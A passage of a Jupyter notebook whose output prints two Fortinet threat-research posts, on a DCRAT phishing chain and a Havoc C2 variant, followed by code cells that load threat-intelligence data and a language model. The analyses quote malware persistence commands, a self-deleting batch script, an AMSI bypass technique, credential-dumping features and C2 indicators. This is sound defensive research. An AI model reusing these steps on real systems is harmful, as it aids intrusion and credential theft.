              "  'content': 'FortiGuard Labs Threat Research Multi-layered obfuscation used to deploy remote access trojan Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Control and collect victim’s sensitive information from the victim’s devicePrevalence:Columbia targetedSeverity Level:High The FortiMail IR team recently uncovered a new email attack distributing a Remote Access Trojan called DCRAT. The threat actor is impersonating a Colombian government entity to target organizations in Colombia. The threat actor uses multiple techniques, such as a password protected archive, obfuscation, steganography, base64 encoding, and multiple file drops, to evade detection. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. 1. Modular ArchitectureDCRAT is designed with a modular structure, allowing attackers to add or remove plugins. This lets them tailor the RAT’s behavior to specific tasks like data theft, surveillance, or persistence. 2. Comprehensive Surveillance CapabilitiesThe RAT allows remote control over infected systems. Attackers can execute commands, manage files, monitor user activity, and even download or run additional malicious payloads. 3. Information TheftIt can steal sensitive information such as credentials, documents, browser data, and personal files. It also supports screenshot capture and keylogging to record user input. 4. System ManipulationDCRAT can alter system settings — rebooting, shutting down, logging off users, or creating new accounts. It can also change visual elements like wallpapers and taskbar visibility. 5. File and Process ManagementThe malware supports creating, deleting, renaming, or moving files and folders. It can run or terminate processes and upload/download files to or from the victim’s system. 6. Browser and Credential HarvestingIt specifically targets browsers to extract stored data such as cookies, browsing history, and saved login credentials. It can also open websites and perform actions in the user’s browser. The threat actor sends an email impersonating a Colombian government entity to trick the user to run the attachment contents while having the recipient in the BCC field: The ZIP attachment contains a bat file which will drop an obfuscated vbs file from a pastebin like website to C:\\\\Windows\\\\Temp: The vbs file is heavily obfuscated and is made to trick analysts and systems: After removing the junk and the obfuscation, we found the following, which eventually runs the base64 variable: The base64 code in the first variable contained another script: Cleaning the above script reveals the following: This script sets a reversed URL as a variable and points it to an image which contains data hidden with base64. Unfortunately, the URL can’t be reversed and the image payload is no longer available. But due to the presence of the URL, which contains an exe file in base64 and the contents of the code itself, it is safe to assume it would extract the image data and invoke a .NET library to download thethird and final payload from the reversed URL to C:\\\\Users\\\\Public\\\\Downloads: The base64 string in the reversed URL contains the RAT exe file. Looking at the main function, we see multiple calls: It starts with a small delay, and then goes into InitializeSettings, which will decrypt settings encrypted with AES256. The AES256 key is hardcoded and is in base 64: Variables revealed after the decryption: Ports– 8848Hosts- 176.]65.]144.]19Version– 1.0.7Install– falseMTX– DcRatMutex_qwqdanchunPastebin– nullAnti– falseAnti_Process– falseBS_OD– falseGroup– AUHWID– This takes the properties of the machine, concatenates them, converts that into an MD5 hash, and then converts that hash into a hexadecimal string. It then takes the first 20 characters and converts them into upper case. Server signature – iHIVV6dj49xn32TizMB3V5F6bAZIlmMWQuHKEN0CBcWc9Ig0HTq78LVe/AKhThRcQR7wOt/8i61T7NkoN+CPhQ8311QUiU2j4NTTO3B/f3ifVSB2vTGJgrF19iqrqUwK8NKkJnHR+29/ec7pz4lMhwJSOhYYj0ZB9BtUYMUzsic= Server certificate - MIICMDCCAZmgAwIBAgIVAJdJTOcvv+RE0UKkRJdxy6sUSIJ9MA0GCSqGSIb3DQEBDQUAMGQxFTATBgNVBAMMDERjUmF0IFNlcnZlcjETMBEGA1UECwwKcXdxZGFuY2h1bjEcMBoGA1UECgwTRGNSYXQgQnkgcXdxZGFuY2h1bjELMAkGA1UEBwwCU0gxCzAJBgNVBAYTAkNOMB4XDTI0MDYyNjE0MzcyN1oXDTM1MDQwNTE0MzcyN1owEDEOMAwGA1UEAwwFRGNSYXQwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKBWZ41Q3CUr6D9fGM31TTe3ObXCDtWIxyuls5ZxROJrzVNlVm5Mb2zSE/543JczTUE94b3YzFPMUMJJ3SB7vpO7L4lMe0W+JlZClj/00M3J6b7a4bB4/c/BVrO3O5RMGNlMSCy68zX8roxt0SFUdlB2L6JJ2xEuaVv/9bdejAK7AgMBAAGjMjAwMB0GA1UdDgQWBBSKoz4PgqFtf1/VImq3jWW0Pxsu5zAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBDQUAA4GBAIrcEfDtCf8noEqBq9iAkPXXTNhGZ3YgwxGfvgWCAGSrWcEdOs2tWJ4Vx1EgAy6SZ6tJq6soFYOJohwV4S22WVnoQzzPgB759pR36AP0zFjxEhhci0wTHQuP8wRW8oTOCsQxjjHrFFBCqHLTq4Wc59cWbLwuTSBSTgqM0u1iOvO9 After initializing those settings, it runs VerifyHash, which checks if the signature is valid for that hash and public key. Following the main function, if Anti had been TRUE, it would run the following anti analysis function: This runs a query that selects everything from Win32_CacheMemory and iterates through each one. Win32_CacheMemory provides info about cache memory devices. If there are none, it could indicate the presence of a VM. Following the next call, it creates a mutex with the mutex name previously decrypted and saved into MTX. (DcRatMutex_qwqdanchun) If the Anti Process were true, it would run a code that would constantly check for the processes mentioned in it and terminate them if detected: After the next call, if BS_OD (i.e., Blue Screen of Death) was set to true and the user had administrative privileges, the code would attempt to mark the malware process as a critical system process using RtlSetProcessIsCritical. Terminating such a process would trigger a blue screen of death. Following the next call, if In_stall were true, it would run through a few blocks of code under Install(). This code block uses FileInfo to retrieve properties of the Install_Folder variable, which in this case points to the AppData\\\\Roaming directory. It then obtains the full file path of the currently running malware and compares it to the Install_Folder path. If the paths do not match, it iterates through all running processes and terminates any that are executing from the Install_Folder location. If the user has administrative privileges, the malware spawns a hidden cmd process to execute a base64-decoded command string: /c schtasks /create /f /sc onlogon /rl highest /tn It then appends parameters to register the malware binary as a scheduled task for persistence. The final command executed is: /c schtasks /create /f /sc onlogon /rl highest /tn \"TASK NAME\" /tr \"\\\\\"FULL PATH OF THE EXECUTABLE\\\\\"\" & exit If the user lacks administrative privileges, the malware instead creates a registry entry under: HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ The entry uses the malware’s filename and path to ensure it is executed at user logon. After completing the previous steps, the malware checks whether the file still exists at the path specified by FullName (i.e., the full path of the currently running executable) and pauses execution for one second. It then creates a new file in the AppData\\\\Roaming directory and copies the current executable into that location. Next, it generates a .bat file in the AppData\\\\Local\\\\Temp directory containing a script designed to execute the dropped file and then delete itself. The contents of the batch file are as follows: @echo offtimeout 3 > NULSTART \"\" \"DROPPED FILE LOCATION\"CD xxx\\\\AppData\\\\Local\\\\Temp\\\\DEL \"BAT FILE NAME\" /he flags: This function instructs Windows to keep the display on and prevent the system from entering sleep mode, maintaining this state continuously until explicitly reset. It uses the value 2147483651U, which corresponds to 0x80000003 in hexadecimal. According to Microsoft’s documentation for SetThreadExecutionState (a function imported from kernel32.dll), this value is a combination of the following flags: Combined, these flags ensure that the system remains active and the screen remains on without interruption. The RAT then checks to see if the user is an admin. If so, it runs the CleanSetting function: This function performs the following: The RAT then calls for the Amsi.Bypass function The function receives two base64-encoded strings and determines whether the current process is running in 32-bit or 64-bit mode. It then passes this architecture-specific value as a byte to the PatchA function. Inside PatchA, the function decodes two base64 strings: \"amsi.dll\" and \"AmsiScanBuffer\". AmsiScanBuffer is a function provided by the Windows Antimalware Scan Interface (AMSI), available in Windows 10 and later. AMSI allows applications to pass memory buffers to the system’s antivirus engine for scanning. The function proceeds to load amsi.dll into memory and retrieves the address of the AmsiScanBuffer function. It then attempts to inject a patch into this memory location, with the goal of sabotaging or disabling AMSI’s ability to detect malicious code. Finally, the RAT enters an infinite loop, continuously attempting to connect to its command-and-control (C2) server. In this case, the C2 address was hardcoded, as noted earlier. However, the RAT also supports retrieving the C2 address dynamically from a remote URL stored in the Paste_bin variable. The attacker sends a phishing email impersonating a Colombian government agency to deceive the user into executing a malicious file. To evade detection, the attack chain employs multiple obfuscation techniques, including steganography and multi-stage payloads. When the file is run, it downloads an obfuscated VBS script from a text-sharing site. This script, in turn, executes obfuscated PowerShell code that retrieves a second link from another sharing site. It then extracts and invokes a .NET library embedded within an image file using steganography to deliver and execute the final payload. The impact of such an attack is severe: giving a threat actor direct access to a victim’s machine can result in the theft of sensitive data, system compromise, and significant operational or financial damage. FortiMail dynamically detects the email, the BAT file, and the VBS file as malware. FortMail also detects the files statically based on the system’s advanced threat engines and previous threat intelligence research. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Agent.CFQ!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. URLs: hxxp[:]//paste[.]ee/d/jYHEqBJ3/0hxxps[:]//paste[.]ee/d/oAqRiS3ghxxps[:]//ia601205[.]us[.]archive[.]org/26/items/new_image_20250430/new_image[.]jpg ZIP:db21cc64fb7a7ed9075c96600b7e7e7007a0df7cb837189c6551010a6f828590BAT:34b8040d3dad4bd9f34738fbc3363fcda819ac479db8497fb857865cee77ad89VBS:b0f3c7ea17875b5e1545678b3878ce268ff4bde718b66254ce01b0bb864801b8EXE:77a22e30e4cc900379fd4b04c707d2dfd174858c8e1ee3f1cbecd4ece1fab3feC2:176[.]65[.]144[.]19[:]8848 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved',\n",
              "  'link': 'https://www.fortinet.com/blog/threat-research/dcrat-impersonating-the-columbian-government'},\n",
              " {'title': 'Dissecting a Malicious Havoc Sample',\n",
              "  'content': \"FortiGuard Labs Threat Research A Follow-Up to “Intrusion into Middle East Critical National Infrastructure Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control the compromised computerSeverity level:High This analysis is a follow-up to the investigation titled ‘Intrusion into Middle East Critical National Infrastructure’(full reporthere), led by the FortiGuard Incident Response Team (FGIR), which investigated a long-term cyber intrusion targeting critical national infrastructure (CNI) in the Middle East. That report revealed that the attacker added several pieces of malware to the system’s Task Scheduler to maintain persistence. In this report, we conduct a detailed analysis of one of the malicious Havoc variant samples. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Havoc is a well-known post-exploitation command and control (C2) backdoor framework, primarily written in C++ and Go. We describe how this Havoc variant is decrypted from a DLL file and then deployed in a newly created “cmd.exe” process, how the Havoc demon communicates with its C2 server, and what malicious actions it can perform on the compromised Windows system. The remote injector (conhost.exe) is launched by the system Task Scheduler using the following command line. C:\\\\Windows\\\\System32\\\\drivers\\\\conhost.exe -f conhost.dll -ER --ln --path cmd.exe Since the release of Windows 7, Windows OS has included conhost.exe (Console Window Host) to handle the command-line interface. The attacker disguised the remote injector as conhost.exe to mislead the victim. According to our analysis, the remote injector supports multiple features controlled by command-line parameters. The “conhost.dll” passed with the “-f” parameter contains the encrypted Havoc payload, and the “cmd.exe” specified by the “--path” parameter is the target process, into which Havoc will be injected and executed. When the fake conhost.exe is executed without any parameters, it displays its help information (Figure 1), which explains how to use the remote injector and its available options. Once the remote injector starts, it creates a “cmd.exe” process, specified by the “-- path” argument, by calling the API CreateProcessA(), as shown in Figure 2. The remote injector then decrypts a Havoc payload, referred to as the Havoc agent or demon within the Havoc framework, using a piece of shellcode embedded in the conhost.dll file. Figure 3 shows the decryption function in the remote injector, a portion of the decrypted shellcode, and the decrypted Havoc payload in the memory at the bottom of the debugger. The decryption key and IV are generated from the first 30H bytes of the conhost.dll file. Next, the remote injector calls two APIs, ZwAllocateVirtualMemory() and ZwWriteVirtualMemory(), using the ProcessHandle of the newly created “cmd.exe” process to inject the decrypted shellcode and Havoc executable into the process. Finally, the remote injector creates a remote thread by calling the ZwCreateThreadEx() API. The ProcessHandle parameter is again set to the newly created “cmd.exe” process, and its lpStartAddress parameter points to the address of the injected shellcode within the process. The purpose of shellcode is to deploy the subsequent Havoc payload (a DLL file) into the “cmd.exe” process and execute it. Havoc Framework is a typical RAT (Remote Access Trojan) and an open-source project available on GitHub. The Framework is written in multiple languages, including Golang, C, C++, Qt, Python, and Assembly (ASM). It was developed byC5piderand released in 2022. In Havoc, the Command and Control (C2) server is referred to as teamserver, while its UI dashboard, used to interact with teamserver, is referred to as the client. The Havoc agent, also known as a demon, runs on the compromised device to receive commands from the C2 server, allowing it to control the system. Figure 4 shows the Havoc client on the server side, where a demon is actively being connected and controlled. Havoc supports HTTP, HTTPS, and SMB protocols to transport commands and results between the C2 server and the compromised devices. In this sample, the C2 server is hardcoded as “apps[.]gist[.]githubapp[.]net.” Unfortunately, the server was unavailable during our analysis. To proceed with our analysis, we set up a simulated Command and Control (C2) server. We modified the protocol from HTTPS to HTTP, allowing the traffic to be captured and analyzed in plaintext without TLS encryption. As long as the Havoc demon is running on the compromised device, it collects metadata about both the compromised Windows system and the Havoc process itself. This metadata is encrypted using the AES algorithm and then sent to the C2 server to register the compromised system on the C2 server. As shown at the bottom of Figure 5, the collected metadata includes various system and process details. The metadata (size:0xBA) contains, but is not limited to, the following information: the agent ID (0x67C54600), Demon ID (0x0F), Host name, User name, Doman, IP address, process name (“C:\\\\Windows\\\\SYSTEM32\\\\cmd.exe”), process ID (0x1ED4), parent PID (0x2444), the process’s load base address, OS version information, OS architecture, and more. Figure 6 shows a demon-init packet containing the AES-encrypted metadata mentioned earlier. This packet must be sent as the first packet to the C2 server to register the victim’s system. We have divided the packet into color-coded sections and broken it down in the table below to explain the contents of each part. Offset Comments +00h The data size, 0xFA. +04h Magic value, 0xDEADBEEF. +08h Agent ID, 0x67C54600. +0Ch Command ID, 0x63. DEMON_INIT. +10h Request ID, 0x0. +14h AES Key, 20h bytes. +34h AES IV, 10h bytes. +44h The AES encrypted metadata. The demon-init packet is sent as the body of an HTTP POST request. When the C2 server receives the packet, it verifies the magic value and decrypts the metadata using the AES key and AES IV included in the packet to complete the registration process. Meanwhile, the demon appears on the client dashboard with the compromised system metadata, just as illustrated in Figure 4. Figure 7 shows a Wireshark screenshot capturing a demon-init packet sent via an HTTP Post request. Havoc defines a wide range of control commands to control the compromised system, listed below: COMMAND_GET_JOB(0x1) COMMAND_INLINEEXECUTE_EXCEPTION(0x1) COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND(0x2) COMMAND_INLINEEXECUTE_RAN_OK(0x3) COMMAND_INLINEEXECUTE_COULD_NO_RUN(0x4) COMMAND_INLINEEXECUTE(0x14) COMMAND_NOJOB(0xA) COMMAND_SLEEP(0xB) COMMAND_PROC_LIST(0xC) COMMAND_FS(0xF) COMMAND_JOB(0x15) COMMAND_INJECT_DLL(0x16) COMMAND_INJECT_SHELLCODE(0x18) COMMAND_SPAWNDLL(0x1A) COMMAND_PROC_PPIDSPOOF(0x1B) CALLBACK_OUTPUT(0x0) CALLBACK_FILE(0x2) CALLBACK_FILE_WRITE(0x8) CALLBACK_FILE_CLOSE(0x9) CALLBACK_ERROR(0xD) CALLBACK_OUTPUT_OEM(0x1E) CALLBACK_OUTPUT_UTF8(0x20) DEMON_INIT(0x63) DEMON_INFO(0x59) BEACON_OUTPUT(0x5E) COMMAND_TOKEN(0x28) COMMAND_OUTPUT(0x5A) COMMAND_ERROR(0x5B) COMMAND_EXIT(0x5C) COMMAND_KILL_DATE(0x5D) COMMAND_CHECKIN(0x64) COMMAND_EXCEPTION(0x98) COMMAND_SYMBOL_NOT_FOUND(0x99) COMMAND_NET(0x834) COMMAND_CONFIG(0x9C4) COMMAND_SCREENSHOT(0x9CE) COMMAND_PIVOT(0x9D8) COMMAND_TRANSFER(0x9E2) COMMAND_SOCKET(0x9EC) COMMAND_KERBEROS(0x9F6) COMMAND_MEM_FILE(0xA00) COMMAND_PACKAGE_DROPPED(0xA0A) COMMAND_PROC(0x1010) COMMAND_PS_IMPORT(0x1011) COMMAND_ASSEMBLY_INLINE_EXECUTE(0x2001) COMMAND_ASSEMBLY_LIST_VERSIONS(0x2003) Most of the commands come with sub-commands to extend their capabilities. For example, theCOMMAND_FS(0xF)has 10 sub-commands: DEMON_COMMAND_FS_DIR(1) DEMON_COMMAND_FS_DOWNLOAD(2) DEMON_COMMAND_FS_UPLOAD(3) DEMON_COMMAND_FS_CD(4) DEMON_COMMAND_FS_REMOVE(5) DEMON_COMMAND_FS_MKDIR(6) DEMON_COMMAND_FS_COPY(7) DEMON_COMMAND_FS_MOVE(8) DEMON_COMMAND_FS_GET_PWD(9) DEMON_COMMAND_FS_CAT(10) Suppose the attacker needs to create a folder named “test” on the compromised system. The packet shown in Figure 8 can be observed: 0x0F is the command ID for DEMON_COMMAND_FS, and 0xA18D02EC is the request ID. The following value indicates the size of the encrypted sub-command and parameters. Within the decrypted sub-command data, 0x06 is the ID for DEMON_COMMAND_FS_MKDIR, and the subsequent data represents the folder name (size + data). In addition to the command and subcommand approach, Havoc also supports the in-memory execution of object files, commonly known as BOFs (Beacon Object Files). The C2 server sends a compiled Object File containing a piece of binary shellcode, which is executed directly in the memory of the demon process on the compromised system. Using BOFs allows Havoc to extend its functionality without replacing or updating the demon itself. Figure 8 shows a recently decrypted object file carried in a packet for the COMMAND_MEM_FILE command (command ID: 0xA00). The packet was sent when we typed “enum_filter_driver” in the client UI. In addition to the control commands, sub-commands, and BOFs introduced earlier, Havoc also implements a wide range of features. These features are categorized into two types: command and module, with each module containing multiple commands. Once we type a command name or a module name followed by its command name, the C2 server generates a command packet with the corresponding command ID and sub-command ID or BOF, which is then sent to the demon to control the compromised system. All the features of Havoc are listed in the table below. Command Name Type Description adcs_enum Command Enumerate CAs and templates in the AD. adcs_request Command Request an enrollment certificate. adduser Command Add a new user to a machine. addusertogroup Command Add a user to the specified group. arp Command Lists out ARP table. bofbelt Command A Seatbelt port using BOFs (Beacon Object Files). cacls Command List user permissions for the specified file. cat Command Display content of the specified file. cd Command Change to a specified directory. checkin Command Request a checkin request. config Module Configure the behavior of the demon session. cp Command Copy file. dcenum Command Enumerate domain information. dir Command List directory. dll Module DLL spawn and injection modules. domainenum Command Lists users accounts in the current domain. dotnet Module Execute and manage dotnet assemblies. download Command Downloads a specified file. driversigs Command Checks drivers for known EDR vendor names. enableuser Command Activates the specified user account. enum_filter_driver Command Enumerate filter drivers. enumlocalsessions Command Enumerate currently attached user sessions. env Command Print environment variables. exit Command Cleanup and exit. get-asrep Command Enumerate a given domain for user accounts with ASREP. get-delegation Command Enumerate a given domain for different types of abusable Kerberos Delegation settings. get-netsession Command Enumerate sessions on the remote device. get-spns Command Enumerate a given domain for user accounts with SPNs. get_password_policy Command Gets a server's configured password policy. help Command Shows help message of specified command. inline-execute Command Executes an object file. ipconfig Command Display network configuration settings . job Module Job manager. jump-exec Module Lateral movement module. kerberoast Command Perform Kerberoasting against specified SPN. klist Command List Kerberos tickets. ldapsearch Command Execute LDAP searches. listdns Command Obtains DNS cache entries. locale Command Prints the locale information of the server. luid Command Get current logon ID. mkdir Command Create new directory. mv Command Move a file or folder. nanodump Command Dump the LSASS process. nanodump_ppl_dump Command Bypass PPL and dump LSASS. nanodump_ppl_medic Command Bypass PPL and dump LSASS. nanodump_ssp Command Load a Security Support Provider (SSP) into LSASS. net Module Network and host enumeration module. netGroupList Command List groups. netGroupListMembers Command List group members. netLclGrpLstMmbrs Command List local group members. netLocalGroupList Command List local group. netshares Command List shared folders. netsharesAdmin Command List details of the shared folders. netstat Command List listening and connected network connections. netuptime Command Obtains the boot time information. netuser Command Get information about specific user. netview Command Lists the workstations and servers. noconsolation Command Execute a PE inline. nslookup Command Make a DNS query on the compromised device . pivot Module Pivoting module. powerpick Command Executes unmanaged powershell commands. powershell Command Executes powershell.exe commands. proc Module Process enumeration and management. ptt Command Import Kerberos ticket into a logon session. purge Command Purge a Kerberos ticket. pwd Command Get current directory. quser Command Simple implementation of quser.exe. reg_delete Command Deletes the registry key or value. reg_query Command Query a registry value or enumerate a single key. reg_query_recursive Command Recursively enumerate a key. reg_save Command Saves the registry path and all subkeys to a file. reg_set Command Creates or sets the specified key or value. remove Command Remove file or directory. resources Command List information of memory and disk drive. routeprint Command Prints route information. rportfwd Module Reverse port forwarding. samdump Command Dumps the SAM, SECURITY and SYSTEM registries to files. sc_create Command Creates a service on the target device. sc_delete Command Deletes the specified service. sc_description Command Sets the description of an existing service. sc_enum Command Enumerate services. sc_qc Command Queries a service with name in BOF (Beacon Object Files). sc_qdescription Command Queries a services description sc_qfailure Command Query a service for failure conditions. sc_qtriggerinfo Command Query a service for trigger conditions. sc_query Command Query services in BOF (Beacon Object Files). sc_start Command Starts a specified service. sc_stop Command Stops a specified service. schtasksenum Command Enumerate scheduled tasks. schtasksquery Command Query the given task in scheduled tasks. screenshot Command Takes a screenshot. sessions Command Get logon sessions. setuserpass Command Sets the password to a specified user account. shell Command Executes Windows commands in cmd.exe. shellcode Module Shellcode injection techniques. sleep Command Sets the delay to sleep. socks Module Manages socks5 proxy. task Module Task manager. tasklist Command List running processes on the remote device. tgtdeleg Command Retrieve a usable TGT for the current user. token Module Token manipulation and impersonation. transfer Command Download transfer module. upload Command Uploads a file. uptime Command Lists system boot time. userenum Command Lists user accounts. whoami Command Get the login user information in BOF (Beacon Object Files). windowlist Command List visible windows, like program windows’ title. wmi_query Command Run a wmi query and display results in CSV format. Here is how a control command is packaged into a packet. Acting as an attacker, we entered the “pwd” command inside the Havoc C2 server and sent it to the demon, which then displayed the command result on our screen. Typically, once the demon has connected to the C2 server, it sends a heartbeat packet to the C2 server approximately every 3 seconds (a random number) to notify the C2 server that the demon is still alive. The heartbeat packet structure is shown in Figure 10. Figure 10 also shows the command packet for the “pwd” command generated by the C2 server at the bottom. The control command data is sent within the response to the heartbeat packet. The command packet begins with a command ID (0x0F for COMMAND_FS), followed by a request ID (0xc5312b04), the size of the encrypted data, and then the encrypted data itself. The encrypted data, “51 7c 66 9c,” decrypts to “00 00 00 09,” which is the sub-command ID 0x9 (for DEMON_COMMAND_FS_GET_PWD) under the command ID 0x0F (COMMAND_FS). This analysis provides a detailed examination of a Havoc variant involved in a long-term cyber intrusion targeting critical national infrastructure in the Middle East. It demonstrates how this remote injector leverages a disguised conhost.exe process to deploy the Havoc payload into a newly created cmd.exe process. The Havoc framework’s modular design, supporting commands, sub-commands, and in-memory execution of Beacon Object Files (BOFs), offers attackers a flexible method to control the remote demon process. Overall, understanding the packet structures, encryption mechanisms, and command execution workflows will help researchers detect and analyze this sophisticated RAT framework. Fortinet customers are already protected from this malware with AntiVirus service, FortiGuard’s Anti-Botnet service, FortiGuard’s AntiSPAM service, and FortiGuard’s Web Filtering service as follows: TheFortiGuard’s Anti-Botnet serviceblocks the DNS requests for the C2 server domain. The domain to the C2 server is rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiGuard Antivirus servicedetects the remote injector and the encrypted Havoc DLL file with the following AV signatures. W64/Havoc.d16b!trData/Havoc.e5b0!tr FortiGuard IPS servicedetects Havoc traffic with the signature “Backdoor.Havoc.Agent”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. We also suggest that our readers go through the\\xa0freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end-users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. apps[.]gist[.]githubapp[.]net [conhost.exe / the remote injector]22BD09FBAB54963D4B0234585D33571A47A2DF569DBAB8B40988415AB0A3C37B[conhost.dll / encrypted Havoc sample with shellcode]9208034AF160357C99B45564FF54570B1510BAF3BC033999AE4281482617FF5B FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved\",\n",
              "  'link': 'https://www.fortinet.com/blog/threat-research/dissecting-a-malicious-havoc-sample'}]"
            ]
          },
          "metadata": {},
          "execution_count": 2
        }
      ],
      "source": [
        "import json\n",
        "import os\n",
        "from pathlib import Path\n",
        "from transformers import pipeline, AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig\n",
        "\n",
        "import torch\n",
        "\n",
        "def load_data(input_file: str) -> list:\n",
        "    \"\"\"\n",
        "    Load JSON data from input file.\n",
        "    \"\"\"\n",
        "    try:\n",
        "        with open(input_file, 'r', encoding='utf-8') as f:\n",
        "            data = json.load(f)\n",
        "        print(f\"✅ Loaded {len(data)} records from {input_file}\")\n",
        "        return data\n",
        "    except Exception as e:\n",
        "        print(f\"❌ Error loading {input_file}: {e}\")\n",
        "        return []\n",
        "\n",
        "data_path =f'{BASE_PATH}/data/processed/merged_threat_intelligence.json'\n",
        "data = load_data(data_path)\n",
        "data[:10]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "d4b3eaaa",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "d4b3eaaa",
        "outputId": "4a3f4189-3d31-4cfc-a90d-7bace1dec429"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Using device: cuda\n",
            "Torch version: 2.8.0+cu126\n"
          ]
        }
      ],
      "source": [
        "# Device detection with MPS support for Apple Silicon\n",
        "import gc\n",
        "\n",
        "if torch.backends.mps.is_available():\n",
        "    device = \"mps\"  # Apple Silicon GPU (M1/M2/M3)\n",
        "elif torch.cuda.is_available():\n",
        "    device = \"cuda\"  # NVIDIA GPU\n",
        "else:\n",
        "    device = \"cpu\"\n",
        "\n",
        "print(f\"Using device: {device}\")\n",
        "print(f'Torch version: {torch.__version__}')\n",
        "\n",
        "# Clear memory based on device\n",
        "if device == \"cuda\":\n",
        "    torch.cuda.empty_cache()\n",
        "    torch.cuda.reset_peak_memory_stats()\n",
        "elif device == \"mps\":\n",
        "    gc.collect()\n",
        "    if hasattr(torch.mps, 'empty_cache'):\n",
        "        torch.mps.empty_cache()\n",
        "elif device == \"cpu\":\n",
        "    gc.collect()\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "71c845a3",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 620,
          "referenced_widgets": [
            "3ef531275f204cc5a1479462f421a013",
            "ae816817df76449fa44db3e159418167",
            "96741bf88ef7446cba4a6d1e9b28b210",
            "5e4984b09d7a461a933811fa112a8b86",
            "f74e9a52623947399a4d40e4c2c3b78f",
            "aa6adb5bd3c74f6ab2fb0089f1eb3fb9",
            "b83ecbae79ae4fa2a537c9cdcd0b682e",
            "cdaa9db2b71d47e9a1aeefaed548cdbc",
            "f71be5ea0d3d4a509e94368e0e9e32b7",
            "7739c23345b645969f1b78f781ccce62",
            "202c677f7541424f82511a75fabe8f7d",
            "b89a598d131948e2a25600adfa323f02",
            "6be0872bd3c54a74a19115ee1af3e93f",
            "cc6add0de6b84514873b52ad9a1cb10c",
            "972f19c2c66e4b7c8a2364d90bdc5efd",
            "05eafa810a1a4799a88243f07406a738",
            "6c86aca7035743cbb3d69b2ad13c788c",
            "2f4840822e4e4dbea05b69f6d9488d39",
            "8e2f1c83fa294543871a2abb5a19d98a",
            "07ed800ab7ee4646aae498faadf60298",
            "a0ab1f695e6349419d5b5b540eb97a00",
            "fefe0e6cc07647399a23dc5ab3ab2430",
            "73ad305807984e3ba23191e5f96b3630",
            "59c8bb3d108c4e6198c11f67c4490a6b",
            "aaaabbfbe2d74d549cf2a94a28a3cef7",
            "27a62b65fd4a4c6cb51403b821403c86",
            "e73f229514da40a9852c0c4cf815e791",
            "57b816c631a34294968367a7dd7f6e03",
            "0df0828a78e8490b8a58f64c3e1e2672",
            "a97f4ac2acb8493c9806c9a52958a910",
            "9414231f99c84cefb65aff441cfe4a93",
            "be7cb937b73d49538b5448e44ca4c185",
            "2cd694cc655d40eb9f0aa8962d12ecb5",
            "68d6f4c2c3384d1984a3d84ca9bd8e15",
            "db6e4170a80c4dc9b6db3a37b9016edb",
            "bc4918d3201046308696d39b4976d25b",
            "a851702e3fa5484fad46fc63348b21d2",
            "b0c4e532eba941608def0bc55ea35d44",
            "277371c4602d4e579e4155050d0481d3",
            "4edc9afe8507490c977a7d4a2e230d6a",
            "7223726cf3eb44b894899e9b7a5257e4",
            "50aa418a6f164dbea1379711802c7bcb",
            "d2a373d0a9424b3e8e6007290e8a62ef",
            "eae8c40081534c398b11083477a75fd4",
            "460bf46c905946f39f87fcd6c5522e7a",
            "7bcbe4f4de784d35b5aef35fd9db61a0",
            "647da9486c7b49789ebfd0b70c853a1e",
            "c1869066f1d24a8f90b30e2ce390f89e",
            "c3fc0f17320b4aa9ad299b8694673f9e",
            "42bb1a2e1924436f857a52ef55c07a18",
            "803a321d794449d9a525293a0287af2d",
            "cab33848e1074f839ed75ac17833c030",
            "0be97aaedace47e186178827f54df105",
            "3cf7d60104ba48c1a53dd16f946f5c59",
            "30960741a75447458f2172bc1bf3b081",
            "0ea81c6c471347a58debc76aca796e62",
            "3110993765d64fadb01846156a260429",
            "b6bfbc670c08494a92e88e2c6e890216",
            "c5ce2b3be5184952b17f212d984a29fb",
            "d08028740f01497a869ed62b5afbb9d6",
            "36b1a32b58e64250898bff2f39b7d374",
            "836f4c792f8e4b5897f24ebf6ad1ef85",
            "215cbea377704480b70a88bb082ebb10",
            "7a6adaa9b81049dc9defaca8d797bc72",
            "82475761054e4872b739a2b953e64298",
            "60cd281ab1f345c2b8023de5adb47c89",
